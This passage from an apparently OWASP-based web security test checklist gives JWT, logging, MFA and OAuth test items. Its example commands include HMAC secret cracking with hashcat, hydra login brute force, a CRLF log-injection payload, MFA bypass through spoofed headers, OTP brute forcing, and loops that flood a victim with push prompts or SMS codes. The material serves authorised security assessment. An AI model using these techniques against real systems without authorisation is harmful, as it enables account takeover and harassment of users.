  *Refs:* owasp_top10: A01:2025; wstg: WSTG-SESS-10; asvs: V9.2.1; cheatsheet: JSON_Web_Token_Cheat_Sheet; cwe: CWE-324, CWE-345

- [ ] **WEB-JWT-006** Check that the service accepts only the right token type  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds services that accept an ID token as an access token, or the reverse.  
  *Steps:*
  1. Get an ID token, an access token and a refresh token.
  2. Send the ID token to an API that needs an access token.
  3. Send an access token where an ID token is needed.
  4. Check the typ header and the validation rules in the code.
  *Example:* `curl -H 'Authorization: Bearer <ID token>' https://target/api/me`  
  *Expected:* Each service accepts only the token type and purpose that it is made for.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-SESS-10; asvs: V9.2.2; cheatsheet: JSON_Web_Token_Cheat_Sheet; cwe: CWE-345, CWE-1259

- [ ] **WEB-JWT-007** Check the audience claim at each service  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds tokens for one service that work at another service.  
  *Steps:*
  1. Log in to a low-privilege app and read the aud claim.
  2. Send the same token to another service or API.
  3. Check that the allowlist of audiences exists in the service.
  4. If one key serves many audiences, check that aud names each one.
  *Example:* `curl -H 'Authorization: Bearer <token for client-portal>' https://internal-admin.example.com/api/v1/users`  
  *Expected:* A service accepts only tokens whose audience names that service. Tokens for one audience fail at another.  
  *Refs:* owasp_top10: A01:2025, A07:2025; wstg: WSTG-SESS-10; asvs: V9.2.3, V9.2.4; cheatsheet: JSON_Web_Token_Cheat_Sheet; cwe: CWE-345, CWE-863

- [ ] **WEB-JWT-008** Check the issuer claim and the key set for each issuer  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds services that accept tokens from the wrong issuer or environment.  
  *Steps:*
  1. Read the iss claim of a token.
  2. Send a token from a staging or other tenant issuer to production.
  3. Read the code: make sure the key set is chosen by the checked issuer.
  4. Make sure missing iss or aud claims are rejected.
  *Example:* `jwt_tool <JWT> to read iss and aud; replay a staging token at the production API.`  
  *Expected:* Only tokens from the configured issuer are accepted, checked with its own keys.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-SESS-10; cheatsheet: JSON_Web_Token_Cheat_Sheet; cwe: CWE-345, CWE-347

- [ ] **WEB-JWT-009** Check for weak HMAC secrets  
  *Severity if fail:* High | *Type:* Automated  
  *Objective:* Finds short, default or guessable signing secrets.  
  *Steps:*
  1. Look for default signing keys in the product and its documentation.
  2. Test the token against a wordlist of common secrets offline.
  3. Read the secret length and the way it is made.
  4. Make sure each audience and issuer has its own secret.
  *Example:* `hashcat -m 16500 jwt.txt rockyou.txt ; jwt_tool <JWT> -C -d wordlist.txt`  
  *Expected:* The HMAC secret is random, at least as long as the hash output, and not shared between issuers or audiences.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-SESS-10; cheatsheet: JSON_Web_Token_Cheat_Sheet; cwe: CWE-521, CWE-798, CWE-326

- [ ] **WEB-JWT-010** Check the JWT payload for sensitive data  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds tokens that expose passwords, hashes or personal data.  
  *Steps:*
  1. Decode the payload of each token type.
  2. List every claim.
  3. Mark claims with sensitive data.
  4. If tokens must hold sensitive data, check for JWE and a fixed algorithm pair.
  *Example:* `jwt_tool <JWT> ; echo '<payload>' | base64 -d | jq .`  
  *Expected:* The payload holds no secrets or unneeded personal data. Signed tokens are treated as readable by anyone.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-SESS-10; cheatsheet: JSON_Web_Token_Cheat_Sheet; cwe: CWE-200, CWE-312

- [ ] **WEB-JWT-011** Check how the JWT is stored and sent  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds tokens sent over HTTP or kept where scripts can read them.  
  *Steps:*
  1. Make sure all calls that carry the token use HTTPS.
  2. If the token is in a cookie, check the cookie attributes.
  3. Look for tokens in localStorage, URLs and logs.
  *Example:* `DevTools > Application > Storage; ZAP passive scan for tokens in URLs.`  
  *Expected:* Tokens travel only over HTTPS. Cookies have Secure, HttpOnly and SameSite. Tokens are not in URLs or logs.  
  *Refs:* wstg: WSTG-SESS-10; cheatsheet: JSON_Web_Token_Cheat_Sheet, Session_Management_Cheat_Sheet; cwe: CWE-319, CWE-922, CWE-598

- [ ] **WEB-JWT-012** Check revocation and logout for self-contained tokens  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds JWTs that stay valid after logout, role change or account removal.  
  *Steps:*
  1. Log in and save the token. Log out.
  2. Send the saved token.
  3. Disable the account or change the role. Send the token again.
  4. Read how the service handles revocation: deny list, status list or short life.
  *Example:* `curl -i -H 'Authorization: Bearer <old JWT>' https://target/api/me after POST /logout.`  
  *Expected:* After logout and account changes the old token is rejected. A revocation method exists and token lifetime is short.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-SESS-10; asvs: V7.4.1; cheatsheet: JSON_Web_Token_Cheat_Sheet, Session_Management_Cheat_Sheet; cwe: CWE-287, CWE-294

- [ ] **WEB-JWT-013** Check the JWT library version and signature edge cases  
  *Severity if fail:* High | *Type:* Config Review  
  *Objective:* Finds libraries with known signature validation flaws.  
  *Steps:*
  1. List the JWT libraries and runtime versions.
  2. Look up known issues for each version.
  3. Test ECDSA tokens with invalid signature values on Java runtimes in the affected range.
  4. Update libraries that have issues.
  *Example:* `npm audit ; pip-audit ; dependency-check --scan . ; java -version`  
  *Expected:* Libraries and runtimes are current and have no known signature issues.  
  *Refs:* wstg: WSTG-SESS-10; cheatsheet: JSON_Web_Token_Cheat_Sheet; cwe: CWE-347

- [ ] **WEB-JWT-014** Check JWE use and compression settings if tokens are encrypted  
  *Severity if fail:* Medium | *Type:* Code Review  
  *Objective:* Finds weak encryption settings in encrypted tokens.  
  *Steps:*
  1. Find tokens with five parts.
  2. Read the alg and enc header values.
  3. Make sure only an allowlisted pair is accepted.
  4. Make sure the zip header is not used.
  *Example:* `jwt_tool <JWE> ; grep -rn 'zip' src/ | grep -i jwe`  
  *Expected:* Only allowlisted alg and enc pairs are used. Keys are bound to one algorithm and claims are not compressed.  
  *Refs:* cheatsheet: JSON_Web_Token_Cheat_Sheet; cwe: CWE-327, CWE-326


## LOG

- [ ] **WEB-LOG-001** Review the logging inventory for each layer of the stack  
  *Severity if fail:* Low | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find layers with unknown logging, storage, access rules or retention.  
  *Steps:*
  1. Ask for the logging inventory.
  2. Check that it lists layers, events, formats, storage, use, access control and retention time.
  3. Compare the inventory with real log sources on a test system.
  *Example:* `Document review; find /var/log -type f -mtime -1; list log groups with aws logs describe-log-groups`  
  *Expected:* A current inventory exists for each layer and matches the real log sources.  
  *Refs:* cheatsheet: Logging_Cheat_Sheet; asvs: V16.1.1; owasp_top10: A09:2025; cwe: CWE-778

- [ ] **WEB-LOG-002** Make sure each log entry has the who, when, where and what  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find log entries that cannot support an investigation.  
  *Steps:*
  1. Trigger a login, a failed access and a data change.
  2. Read the log entries for each.
  3. Check that they show time, source, user, action, object and result.
  4. Check that the entries can be linked by a request or session ID.
  *Example:* `grep -E 'login|denied' /var/log/app/app.log | tail -5`  
  *Expected:* Each security log entry has time, place, user, action and outcome. Entries can be correlated.  
  *Refs:* cheatsheet: Logging_Cheat_Sheet; asvs: V16.2.1; owasp_top10: A09:2025; cwe: CWE-223, CWE-778; capec: CAPEC-93

- [ ] **WEB-LOG-003** Check log time sources and time zone in timestamps  
  *Severity if fail:* Low | *Type:* Manual, Config Review | *Level:* ASVS L2  
  *Objective:* Find logging components with unsynchronized clocks or timestamps without a time zone.  
  *Steps:*
  1. Check the time sync source (NTP or chrony) on every logging component.
  2. Compare the clock offset between components.
  3. Check that log timestamps use UTC or show the offset.
  *Example:* `chronyc tracking; timedatectl; grep -m3 -E '[0-9]{4}-[0-9]{2}-[0-9]{2}T' app.log`  
  *Expected:* Clocks are in sync and log timestamps use UTC or an explicit offset.  
  *Refs:* cheatsheet: Logging_Cheat_Sheet; asvs: V16.2.2; owasp_top10: A09:2025

- [ ] **WEB-LOG-004** Make sure logs go only to the documented files and services  
  *Severity if fail:* Low | *Type:* Manual, Config Review | *Level:* ASVS L2  
  *Objective:* Find logs that are written or sent to places outside the inventory.  
  *Steps:*
  1. List all log files and log targets that the application uses.
  2. Check network connections for log traffic to unknown hosts.
  3. Compare them with the inventory.
  *Example:* `lsof -p <pid> | grep -E 'log|\.out'; ss -tnp | grep <pid>`  
  *Expected:* The application writes and sends logs only to the documented targets.  
  *Refs:* cheatsheet: Logging_Cheat_Sheet; asvs: V16.2.3; owasp_top10: A09:2025

- [ ] **WEB-LOG-005** Make sure logs use a common format that the processor reads  
  *Severity if fail:* Low | *Type:* Manual, Config Review | *Level:* ASVS L2  
  *Objective:* Find log formats that the processor cannot parse or correlate.  
  *Steps:*
  1. Look at the format of logs from each component.
  2. Check that the log processor parses them without errors.
  3. Check that the event names follow a shared vocabulary.
  *Example:* `jq . app.log | head; check parser error counts in the SIEM`  
  *Expected:* Logs follow a common format, parse without errors, and can be correlated.  
  *Refs:* asvs: V16.2.4; owasp_top10: A09:2025; cheatsheet: Logging_Vocabulary_Cheat_Sheet, Logging_Cheat_Sheet

- [ ] **WEB-LOG-006** Make sure logs hold no credentials, tokens or protected personal data  
  *Severity if fail:* High | *Type:* Manual, Automated | *Level:* ASVS L2  
  *Objective:* Find passwords, session IDs, tokens and card data in logs.  
  *Steps:*
  1. Send requests with test passwords, tokens, card numbers and personal data.
  2. Search the log files and the log platform for these test values.
  3. Check that session tokens are hashed or masked, and that debug logs hold no secrets.
  4. Check that logging failures do not show debug data to users.
  *Example:* `grep -rEn 'password=|Authorization: Bearer|[0-9]{13,16}' /var/log/app/; trufflehog filesystem /var/log/app`  
  *Expected:* Logs follow the rules for each data level. They hold no passwords, secrets, tokens or full card numbers.  
  *Refs:* cheatsheet: Logging_Cheat_Sheet; asvs: V16.2.5; wstg: WSTG-CONF-02; owasp_top10: A09:2025; cwe: CWE-532, CWE-779

- [ ] **WEB-LOG-007** Make sure all authentication events are logged  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find login, logout, MFA and reset events that leave no log.  
  *Steps:*
  1. Do a successful login, failed logins, a locked account and an MFA failure.
  2. Do a password reset and a password change.
  3. Read the logs for each event.
  4. Check for authentication type and factors in the entries.
  *Example:* `grep -E 'authn_|login' /var/log/app/security.log`  
  *Expected:* All successful and failed authentication operations are logged with the method used.  
  *Refs:* asvs: V16.3.1; owasp_top10: A09:2025; cheatsheet: Logging_Cheat_Sheet, Logging_Vocabulary_Cheat_Sheet; cwe: CWE-778

- [ ] **WEB-LOG-008** Make sure failed authorization events are logged  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find access denials that leave no trace.  
  *Steps:*
  1. Request another user's object and an admin function with a low-privilege account.
  2. Read the log for each denial.
  3. For L3, check that sensitive data access is logged without the data itself.
  *Example:* `curl -si -H 'Cookie: session=LOW' https://example.com/admin/users; tail -n 20 /var/log/app/security.log`  
  *Expected:* Each failed authorization creates a log entry with user and resource.  
  *Refs:* cheatsheet: Logging_Cheat_Sheet; asvs: V16.3.2; owasp_top10: A09:2025; cwe: CWE-778

- [ ] **WEB-LOG-009** Make sure security events and control bypass tries are logged  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find attacks on validation, business logic and anti-automation that leave no log.  
  *Steps:*
  1. Send invalid input, tampered tokens, out-of-order workflow steps and repeated rapid requests.
  2. Read the logs for each try.
  3. Check that the events in the security documentation are all logged.
  4. Check that the logs hold high-risk actions such as admin actions and data export.
  *Example:* `zap-baseline.py -t https://example.com ; then count related entries in the security log`  
  *Expected:* Security events and tries to bypass controls are logged with enough context to start an investigation.  
  *Refs:* cheatsheet: Logging_Cheat_Sheet; asvs: V16.3.3; owasp_top10: A09:2025; cwe: CWE-778, CWE-223

- [ ] **WEB-LOG-010** Make sure unexpected errors and security control failures are logged  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find errors and failed controls, such as backend TLS failures, that nobody sees.  
  *Steps:*
  1. Force an unhandled error with bad input.
  2. Break a backend TLS connection in a test system.
  3. Read the log for both events.
  4. Check that the log has the cause but no secrets.
  *Example:* `curl -s 'https://example.com/?id=%00' ; tail -n 20 /var/log/app/error.log`  
  *Expected:* Unexpected errors and control failures create log entries with the cause and without secrets.  
  *Refs:* cheatsheet: Logging_Cheat_Sheet; asvs: V16.3.4; owasp_top10: A09:2025, A10:2025; cwe: CWE-778

- [ ] **WEB-LOG-011** Test log injection and make sure logging components encode data  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find user input that can forge or break log lines.  
  *Steps:*
  1. Send input with CRLF, JSON quotes, and log format fields in parameters, headers and user names.
  2. Read the log for forged lines or broken structure.
  3. Check that the log viewer escapes HTML and other control characters.
  *Example:* `curl -s 'https://example.com/login' -d $'user=admin\r\n2026-01-01 INFO login success user=admin&pass=x'`  
  *Expected:* Logging encodes user input. An attacker cannot add or change log entries.  
  *Refs:* cheatsheet: Logging_Cheat_Sheet; asvs: V16.4.1; owasp_top10: A09:2025; cwe: CWE-117; capec: CAPEC-93

- [ ] **WEB-LOG-012** Make sure logs are protected from unauthorized access and change  
  *Severity if fail:* High | *Type:* Manual, Config Review | *Level:* ASVS L2  
  *Objective:* Find logs that unauthorised users can read, change or delete.  
  *Steps:*
  1. Check file and storage permissions of the log files and log platform.
  2. Try to read, edit and delete a log entry with a normal service account.
  3. Check for append-only, write-once or hash chain protection.
  4. Check that web access to log files is blocked.
  *Example:* `ls -l /var/log/app/; lsattr /var/log/app/*; curl -si https://example.com/logs/app.log`  
  *Expected:* Only authorized roles can read logs. Nobody can change them. Web access is blocked.  
  *Refs:* cheatsheet: Logging_Cheat_Sheet; asvs: V16.4.2; owasp_top10: A09:2025; cwe: CWE-532, CWE-732; capec: CAPEC-81

- [ ] **WEB-LOG-013** Make sure logs are sent securely to a separate system  
  *Severity if fail:* Medium | *Type:* Config Review, Manual | *Level:* ASVS L2  
  *Objective:* Find logs that stay on the host an attacker can reach.  
  *Steps:*
  1. Find the log shipping configuration.
  2. Check that the transport uses TLS and that the target is a separate system with other credentials.
  3. Delete a local log in a test system and check that the remote copy stays.
  4. Check that the pipeline gives alerts and escalation.
  *Example:* `cat /etc/rsyslog.d/*.conf | grep -E '@@|tls'; filebeat test output`  
  *Expected:* Logs go over TLS to a logically separate system. Local tampering does not change the remote copy.  
  *Refs:* cheatsheet: Logging_Cheat_Sheet; asvs: V16.4.3; owasp_top10: A09:2025; cwe: CWE-778

- [ ] **WEB-LOG-014** Check that attacks create alerts and that responders get them  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Find monitoring that does not detect or escalate active attacks.  
  *Steps:*
  1. Run a scan with ZAP or Burp against the test system, or a series of failed logins.
  2. Look at whether alerts are created within the agreed time.
  3. Check that alerts reach the people who respond, with a playbook.
  4. Check the alert thresholds and the rate of false alarms.
  5. Check that honeytoken access creates an alert, if used.
  *Example:* `hydra -l admin -P short.txt example.com http-post-form '/login:u=^USER^&p=^PASS^:F=invalid'; then check the SIEM`  
  *Expected:* Attacks and DAST scans create alerts. Responders receive them and follow a playbook.  
  *Refs:* owasp_top10: A09:2025; cheatsheet: Logging_Cheat_Sheet; cwe: CWE-778


## MFA

- [ ] **WEB-MFA-001** Check that MFA or several factors protect access  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds single-factor access to the application, or MFA that uses the same factor twice.  
  *Steps:*
  1. List the factors that the login needs.
  2. Make sure at least two different factor types are needed, or approved single-factor combinations.
  3. Check that two secrets of the same type, such as password plus PIN, are not counted as MFA.
  4. For L3 systems, check that one factor is hardware-based and phishing resistant.
  *Example:* `Burp history: record each login step; check that the session cookie is issued only after the second factor.`  
  *Expected:* Access needs MFA or an approved combination of factors. Two factors of the same type do not count. L3 systems use a phishing-resistant hardware factor.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-ATHN-11; asvs: V6.3.3; cheatsheet: Multifactor_Authentication_Cheat_Sheet, Authentication_Cheat_Sheet; cwe: CWE-308, CWE-309, CWE-654

- [ ] **WEB-MFA-002** Try to bypass MFA with other paths and headers  
  *Severity if fail:* Critical | *Type:* Manual  
  *Objective:* Finds login paths or flags that skip the second factor.  
  *Steps:*
  1. List all login paths: main page, API, mobile API, federated login, test pages.
  2. Log in with the password only. Request a protected page directly.
  3. Call the API login endpoints with the password only.
  4. Add X-Forwarded-For or debug headers such as X-Debug to the login.
  5. Try a local login for an account that was linked to a federated login.
  6. Try the hard-coded or break-glass account.
  *Example:* `curl -i -b 'session=<pre-mfa cookie>' https://target/account ; curl -i -H 'X-Forwarded-For: 10.0.0.5' -H 'X-Debug: 1' -d 'u=a&p=b' https://target/api/login`  
  *Expected:* Every login path needs the second factor. Headers, IP values and special accounts do not skip it.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-ATHN-11; cheatsheet: Multifactor_Authentication_Cheat_Sheet; cwe: CWE-304, CWE-288, CWE-290, CWE-291, CWE-308; capec: CAPEC-115

- [ ] **WEB-MFA-003** Test OTP brute force and rate limit  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds OTP checks with no rate limit or lockout, so codes can be guessed.  
  *Steps:*
  1. Log in with the password and stop at the OTP page.
  2. Send 100 wrong codes in a short time.
  3. Check for lockout, delay or a new code requirement.
  4. Check that a failure count follows the account and not only the IP address.
  5. Send many codes from several IP addresses.
  *Example:* `Burp Intruder: POST /mfa/verify code=§000000§ (numbers 000000-000200); look at status codes for a lockout.`  
  *Expected:* The application limits wrong OTP codes per account, locks or delays, and logs the events. Longer codes or 64-bit entropy add safety.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-ATHN-11, WSTG-ATHN-03; asvs: V6.6.3; cheatsheet: Multifactor_Authentication_Cheat_Sheet; cwe: CWE-307, CWE-770; capec: CAPEC-112

- [ ] **WEB-MFA-004** Check that OTPs, lookup secrets and TOTP work only once  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds codes that can be reused.  
  *Steps:*
  1. Log in and capture the valid OTP request.
  2. Log out and log in again. Send the same code.
  3. Replay the captured request at once.
  4. Use a recovery code twice.
  *Example:* `Burp Repeater: send POST /mfa/verify twice with the same code; the second request must fail.`  
  *Expected:* Each lookup secret, out-of-band code and TOTP value works only once.  
  *Refs:* wstg: WSTG-ATHN-11; asvs: V6.5.1; cheatsheet: Multifactor_Authentication_Cheat_Sheet; cwe: CWE-294, CWE-308; capec: CAPEC-60

- [ ] **WEB-MFA-005** Check the lifetime of OTP codes and TOTP  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds codes that stay valid for too long.  
  *Steps:*
  1. Request an out-of-band code.
  2. Send it after 5, 10 and 11 minutes.
  3. Send a TOTP value from 30, 60 and 90 seconds ago.
  4. Request a new code and test the old one.
  *Example:* `oathtool --totp -b $SECRET -N '-90 seconds' ; submit the value to /mfa/verify.`  
  *Expected:* Out-of-band codes expire in 10 minutes or less. TOTP values are valid for 30 seconds or a small window. A new code cancels the old one.  
  *Refs:* wstg: WSTG-ATHN-11; asvs: V6.5.5; cheatsheet: Multifactor_Authentication_Cheat_Sheet; cwe: CWE-324

- [ ] **WEB-MFA-006** Check the generation and strength of OTPs and lookup secrets  
  *Severity if fail:* High | *Type:* Code Review | *Level:* ASVS L2  
  *Objective:* Finds predictable or short codes, or weak TOTP seeds.  
  *Steps:*
  1. Request 50 codes and examine them for patterns.
  2. Check the code length: at least 20 bits (6 digits).
  3. Read the code for the random function. It must be a CSPRNG.
  4. Check that TOTP seeds come from a CSPRNG and are at least 160 bits.
  *Example:* `grep -rn 'Math.random\|rand()\|random.randint' src/ ; Burp Sequencer on 50 OTPs.`  
  *Expected:* Codes and seeds come from a CSPRNG and have enough entropy.  
  *Refs:* wstg: WSTG-ATHN-11; asvs: V6.5.3, V6.5.4; cheatsheet: Multifactor_Authentication_Cheat_Sheet; cwe: CWE-330, CWE-331, CWE-338

- [ ] **WEB-MFA-007** Check the storage of lookup secrets  
  *Severity if fail:* Medium | *Type:* Code Review | *Level:* ASVS L2  
  *Objective:* Finds recovery codes stored in clear text or with a fast hash.  
  *Steps:*
  1. Find where recovery codes are stored.
  2. Check the code entropy.
  3. For secrets below 112 bits, check for a password hash with a 32-bit random salt.
  4. Make sure OTP values are not in logs.
  *Example:* `SELECT code FROM recovery_codes LIMIT 5; grep -rn 'recovery' src/ | grep -i hash`  
  *Expected:* Lookup secrets under 112 bits are hashed with an approved password hash and salt. Codes are not logged.  
  *Refs:* asvs: V6.5.2; cheatsheet: Multifactor_Authentication_Cheat_Sheet, Password_Storage_Cheat_Sheet; cwe: CWE-256, CWE-916, CWE-312

- [ ] **WEB-MFA-008** Check that out-of-band codes belong to one request  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds codes that work for another login request or another user.  
  *Steps:*
  1. Start two logins for the same user. Collect the code from the first.
  2. Use the code of the first login in the second.
  3. Use a code of user A in the login of user B.
  *Example:* `Two Burp sessions: take code from mail 1 and POST it with the session cookie from login 2.`  
  *Expected:* A code is bound to the original authentication request. It works only there.  
  *Refs:* wstg: WSTG-ATHN-11; asvs: V6.6.2; cheatsheet: Multifactor_Authentication_Cheat_Sheet; cwe: CWE-294, CWE-287

- [ ] **WEB-MFA-009** Check the use of SMS and phone calls as factors  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds PSTN codes sent to unverified numbers, or with no stronger option.  
  *Steps:*
  1. Add a phone number. Check that the application validates it.
  2. Check that stronger factors such as TOTP are offered.
  3. Look for a warning about the risks of SMS.
  4. For L3 systems, check that SMS is not accepted.
  *Example:* `POST /profile/phone number=+15550100 ; then check that no code goes out before validation.`  
  *Expected:* PSTN codes go only to validated numbers. Stronger methods exist and the user sees a risk notice. L3 systems do not use PSTN.  
  *Refs:* wstg: WSTG-ATHN-11; asvs: V6.6.1; cheatsheet: Multifactor_Authentication_Cheat_Sheet; cwe: CWE-308

- [ ] **WEB-MFA-010** Check push MFA for flooding and number matching  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Finds push MFA that lets an attacker flood the user until a prompt is accepted.  
  *Steps:*
  1. Log in with the password 10 times.
  2. Count the push prompts that the user phone gets.
  3. Check that the prompt shows context: place, device and time.
  4. Check for number matching.
  *Example:* `for i in $(seq 10); do curl -s -d 'u=victim&p=<pw>' https://target/login; done and count prompts on the test phone.`  
  *Expected:* The application limits push requests, shows context, and uses number matching.  
  *Refs:* wstg: WSTG-ATHN-11; asvs: V6.6.4; cheatsheet: Multifactor_Authentication_Cheat_Sheet; cwe: CWE-799, CWE-770

- [ ] **WEB-MFA-011** Check that an authentication factor can be revoked  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Finds lost or stolen factors that stay valid.  
  *Steps:*
  1. Enrol a test device or token.
  2. Revoke it in the profile or as administrator.
  3. Try to log in with the revoked factor.
  *Example:* `DELETE /api/mfa/devices/<id> then replay a code from that device.`  
  *Expected:* A revoked factor cannot be used for authentication. The user is notified.  
  *Refs:* asvs: V6.5.6; cheatsheet: Multifactor_Authentication_Cheat_Sheet; cwe: CWE-324

- [ ] **WEB-MFA-012** Check that biometrics are only a second factor  
  *Severity if fail:* Low | *Type:* Config Review | *Level:* ASVS L3  
  *Objective:* Finds biometrics used alone.  
  *Steps:*
  1. Read the authentication design.
  2. Look for biometric login paths.
  3. Try to log in with the biometric only.
  *Example:* `Review the WebAuthn or app configuration: userVerification and the required factors per login.`  
  *Expected:* Biometrics are used only together with something the user has or knows.  
  *Refs:* asvs: V6.5.7; cheatsheet: Multifactor_Authentication_Cheat_Sheet; cwe: CWE-308

- [ ] **WEB-MFA-013** Check the time source for TOTP checks  
  *Severity if fail:* Medium | *Type:* Code Review | *Level:* ASVS L3  
  *Objective:* Finds TOTP checks that use the client time.  
  *Steps:*
  1. Read the code that checks TOTP.
  2. Send a client time or time zone value in the request.
  3. Change the device clock. Test the code.
  *Example:* `grep -rn 'totp' src/ | grep -i 'timestamp\|time(' ; add 'ts=<value>' to POST /mfa/verify.`  
  *Expected:* The server uses its own trusted time source. Client time has no effect.  
  *Refs:* wstg: WSTG-ATHN-11; asvs: V6.5.8; cheatsheet: Multifactor_Authentication_Cheat_Sheet; cwe: CWE-345

- [ ] **WEB-MFA-014** Check the MFA recovery process and identity proof  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds weak ways to regain access after a lost factor.  
  *Steps:*
  1. Start the MFA recovery process.
  2. Examine the proof of identity that the process needs.
  3. Compare it with the proof at enrolment.
  4. Test recovery codes: length, single use, brute-force limit and notice.
  5. Look for security questions as a fallback.
  *Example:* `Burp Intruder on POST /mfa/recovery code=§§ ; read the mail for the notice.`  
  *Expected:* Recovery needs identity proof at the same level as enrolment. Recovery codes are strong, single use and rate limited. No weak fallback exists.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-ATHN-11; asvs: V6.4.4; cheatsheet: Multifactor_Authentication_Cheat_Sheet, Forgot_Password_Cheat_Sheet; cwe: CWE-640, CWE-308

- [ ] **WEB-MFA-015** Check that password reset does not bypass MFA  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds reset flows that give access without the second factor.  
  *Steps:*
  1. Enable MFA on a test account.
  2. Reset the password with the email link.
  3. Check if the application logs in the user without MFA.
  4. Log in with the new password and check that MFA is still needed.
  *Example:* `Complete /forgot -> /reset/confirm and call GET /account with the returned cookie.`  
  *Expected:* Reset does not remove or skip MFA. The user still needs the second factor after the reset.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-ATHN-09, WSTG-ATHN-11; asvs: V6.4.3; cheatsheet: Forgot_Password_Cheat_Sheet, Multifactor_Authentication_Cheat_Sheet; cwe: CWE-304, CWE-640

- [ ] **WEB-MFA-016** Check the management of MFA settings  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds MFA settings that can be changed without re-authentication, by CSRF or by IDOR.  
  *Steps:*
  1. Disable MFA or change the device with a stolen session cookie only.
  2. Send the change request from another site without a CSRF token.
  3. Change the user ID in the request to another account.
  4. Check for a notice to the user.
  *Example:* `Burp Repeater: POST /account/mfa/disable with only the session cookie; then add user=victim.`  
  *Expected:* Changes to MFA need a strong re-authentication, a CSRF token and ownership checks. The user gets a notice.  
  *Refs:* wstg: WSTG-ATHN-11; cheatsheet: Multifactor_Authentication_Cheat_Sheet; cwe: CWE-620, CWE-352, CWE-639

- [ ] **WEB-MFA-017** Check trusted IP, location and certificate based factors  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds factors that can be forged with headers or an unrestricted certificate authority.  
  *Steps:*
  1. Set X-Forwarded-For to a trusted IP address.
  2. List the trusted IP ranges: look for guest Wi-Fi and cloud ranges.
  3. Check which CAs the server trusts for client certificates.
  4. Use a certificate from another CA, and one issued to another user.
  *Example:* `openssl s_client -connect target:443 | grep -A5 'Acceptable client certificate CA' ; curl -H 'X-Forwarded-For: 10.0.0.1' https://target/login`  
  *Expected:* Header values do not set trust. Only reviewed ranges are trusted. Client certificates are accepted from approved CAs and only for the owner.  
  *Refs:* wstg: WSTG-ATHN-11; cheatsheet: Multifactor_Authentication_Cheat_Sheet; cwe: CWE-291, CWE-290, CWE-295

- [ ] **WEB-MFA-018** Check OTP delivery abuse and SMS or email flooding  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds missing limits on code sending, which allows harassment and cost abuse.  
  *Steps:*
  1. Request 20 codes for one account in one minute.
  2. Check the number of messages sent.
  3. Check that a new code cancels the old one.
  4. Try the limit with different IP addresses.
  *Example:* `for i in $(seq 20); do curl -s -o /dev/null -w '%{http_code}\n' -d 'user=victim' https://target/mfa/send; done`  
  *Expected:* The number of codes per account and per time is limited. A new code replaces the old one.  
  *Refs:* wstg: WSTG-ATHN-11; cheatsheet: Multifactor_Authentication_Cheat_Sheet; cwe: CWE-770, CWE-799


## OAUTH

- [ ] **WEB-OAUTH-001** Check that tokens go only to components that need them  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds access and refresh tokens exposed to browser code or other components.  
  *Steps:*
  1. Map which components hold access and refresh tokens.
  2. Look in browser storage and page scripts for tokens.
  3. For browser apps, check whether a back-end-for-frontend keeps the tokens.
  *Example:* `DevTools > Application > Storage; Burp: search the history for access_token and refresh_token.`  
  *Expected:* Tokens are available only to the components that need them. Browser code does not hold refresh tokens.  
  *Refs:* wstg: WSTG-ATHZ-05; asvs: V10.1.1; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-922, CWE-200

- [ ] **WEB-OAUTH-002** Check that the client binds responses to its own request  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds clients that accept a code or ID token from a flow they did not start.  
  *Steps:*
  1. Start a login and save state, nonce and code_verifier.
  2. Check that the values are random and tied to the browser session.
  3. Send a callback with a code from another session.
  4. Send a callback with a missing or wrong state.
  *Example:* `Burp: replay GET /callback?code=<code of session A>&state=<state of A> in the session of B.`  
  *Expected:* The client accepts a response only for a flow started by the same browser session. Values are unpredictable.  
